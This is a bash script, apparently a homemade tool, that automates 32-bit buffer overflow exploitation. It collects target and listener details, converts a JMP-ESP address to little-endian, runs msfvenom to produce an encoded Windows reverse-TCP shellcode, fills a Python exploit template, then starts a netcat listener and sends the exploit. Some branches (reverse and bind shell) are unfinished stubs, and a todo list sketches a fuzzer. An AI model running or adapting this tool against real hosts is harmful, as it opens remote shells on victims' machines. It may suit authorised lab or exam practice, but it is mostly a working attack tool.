#fmlsec
#designed for 32bit buffer overflow exploits
cw=$(tput setaf 7)
co=$(tput setaf 208)
cg=$(tput setaf 28)
cr=$(tput setaf 196)
title(){
echo ${co}'                  _ '
echo ${co}' _    |_ _ |_  _ (_ '
echo ${co}'(_||_||_(_)|_)(_)|  '
echo ${cw}'................x86.'
echo ${co}'by fmlsec'
echo ""
entry
}
entry(){
	echo ${co}'<< CONNECTION SETTINGS >>'${cw}
	echo "Enter RHOST"
	read -p "> " RHOST
	echo ${cg}"[!] RHOST => $RHOST"${cw}
	echo "Enter RPORT"
	read -p "> " RPORT
	echo ${cg}"[!] RPORT => $RPORT"${cw}
	LHOST=$(ifconfig tun0 | head -2 | tail -1 | sed "s/[a-z]//g" | cut -c1-20 | sed "s/ //g")
	echo ${cg}"[!] LHOST => $LHOST"${cw}
	echo "Enter LPORT"
	read -p "> " LPORT
	echo ${cg}"[!] LPORT => $LPORT"${cw}
	echo "Enter PAYLOAD NAME"
	read -p "> " FILENAME
	if [ -z $FILENAME ];
	then
		echo "Cannot have blank filename, Restarting.."
		clear
		title
	fi
	echo ${cg}"[!] NAME => $FILENAME"${cw}
	echo "FUZZ? (y/n)"
	read -p "> " FUZZ
	if [ $FUZZ == 'n' ];
	then
		entry2
	elif [ $FUZZ == 'y' ];
	then
		fuzz
	else
		echo ${cr}"Incorrect Choice"
		echo "Defaulting to N"
		entry2
	fi
}
entry2(){
	echo ${co}'<< EXPLOIT SETTINGS >>'${cw}
	if [ -z $OFFSET ];
	then
		echo "OFFSET"
		read -p "> " OFFSET
	fi
	echo ${cg}"[!] OFFSET => $OFFSET"${cw}
	echo "JMP-ESP ADDRESS (RAW)"
	read -p "> " JMPADDR
	pc="\x"
	hex=${JMPADDR:6:2}${JMPADDR:4:2}${JMPADDR:2:2}${JMPADDR:0:2}
	endian=$(echo "$hex" | sed -e "s/.\{2\}/&\\\x/g" | cut -c1-14 )
	var1=$(echo $hex | cut -c1-2)
	var2=$(echo $hex | cut -c3-4)
	var3=$(echo $hex | cut -c5-6)
	var4=$(echo $hex | cut -c7-8)
	lendian=$pc$endian
	asdf=$(printf "%s" $lendian)
	len=$(echo $lendian | wc -c)
	if [ $len -gt 20 ];
	then
		echo ${cr}"Invalid JMP-ESP Address"
		entry2
	fi
	echo ${cg}"[!] JMP-ESP ADDRESS = ""'"$asdf"'"${cw}
	echo "Generate Shellcode? (y/n)"
	read -p "> " SHELLCHOICE
	if [ $SHELLCHOICE == 'n' ];
	then
		shellcode="xx"
		replace
	elif [ $SHELLCHOICE == 'y' ];
	then
		shellcodegen
	else
		echo ${cr}"Incorrect Choice"
		entry2
	fi
}
shell(){
	echo ${co}"[!] Starting listener and sending payload"
	clear
	echo "IF no call soon, re-evaulate entries"${cw}
	nc -lvnp $LPORT; python $FILENAME.py
}
fuzz(){
	echo ${co}"[!] Starting Fuzzer, may take a minute"${cw}
	python fuzz.py $RHOST $RPORT
	wait 60
	OFFSET=$(cat offset.txt)
	echo ${cg}"[!] OFFSET FOUND, PROCEEDING"${cw}
	entry2

}
shellcodegen(){
	echo ${cw}"Enter RAW Bad Characters"
	read -p "> " badchar
	filter=$(echo "$badchar" | sed -e "s/.\{2\}/&\\\x/g" | rev | cut -c 3- | rev)
	badchars=$pc$filter
	echo ${cg}"[!] Bad Character(s) => $badchars" ${cw}
	echo "Select Type (calc, reverse, bind)"
	read -p "> " SHELLTYPE
	if [ $SHELLTYPE == 'calc' ];
	then
		##edit yo
		shellcode=$(msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp -b $badchars -e x86/shikata_ga_nai -i 3 -f python -v shellcode -o tmpfile)
		fshellcode=$(cat tmpfile | base64)
	elif [ $SHELLTYPE == 'reverse' ];
	then
		echo "Enter Remote System OS (windows/unix)"
		read -p "> " SYSOS
		if [ $SYSOS == 'windows' ];
		then
			echo "A"
			##windows x86 revshell##
		elif [ $SYSOS == 'unix' ];
		then
			echo "A"
			##unix x86 revshell
		else 
			echo ${cr}"Unknown OS"${cw}
			shellcodegen
		fi
	elif [ $SHELLTYPE == 'bind' ];
	then
		echo "Enter Remote System OS (windows/unix)"
		read -p "> " SYSOS
		if [ $SYSOS == 'windows' ];
		then
			echo "A"
			##windows x86 bindshell##
		elif [ $SYSOS == 'unix' ];
		then
			echo "A"
			##unix x86 bindshell##
		else
			echo ${cr}"Unknown OS"${cw}
			shellcodegen
		fi
	else
		echo ${cr}"Invalid Option"${cw}
		shellcodegen
	fi
	wait
	echo ${cg}"[!] Shellcode Generated with LHOST="$LHOST" & LPORT="$LPORT
	replace
}
replace(){
	file=$FILENAME.py
	cp ./template.txt ./"$file"
	sed -i -e "s/TARGET/$RHOST/g" "$file"
	sed -i -e "s/PORT/$RPORT/g" "$file"
	sed -i -e "s/OFFSETVAR/$OFFSET/g" "$file"
	### sort address + shellcode passing
	sed -i -e "s/QWE/$var1/g" "$file"
	sed -i -e "s/ERT/$var2/g" "$file"
	sed -i -e "s/TYU/$var3/g" "$file"
	sed -i -e "s/UIO/$var4/g" "$file"
	sed -i -e "s/SHELLCODEV/$fshellcode/g" "$file"

	if [ -z $shellcode ];
	then
		echo ${co}"Create Shellcode then execute exploit manually."
		exit
	fi
		echo ${cw}"View Exploit? (y/n)"
		read -p "> " VIEW
		if [ $VIEW == 'y' ];
		then
			cat $file
		fi
		echo ${cw}"Do you want to start a listener and send the exploit? (y/n)"
		read -p "> " FIRECHOICE
		if [ $FIRECHOICE == 'n' ];
		then
			echo ${co}"Exiting..."
			exit
		else
			shell
		fi
	
	echo ${cw}"[*] Exploit Created"
}
title

##todo
#moveshellcode down
#figure out shellcode => file
#fuzzer
#types (smtp, http, regular)
#fuzzer -> send A's to crash, then get user to enter rando number, send pattern. read pattern and calc offset. pass offset back to script.
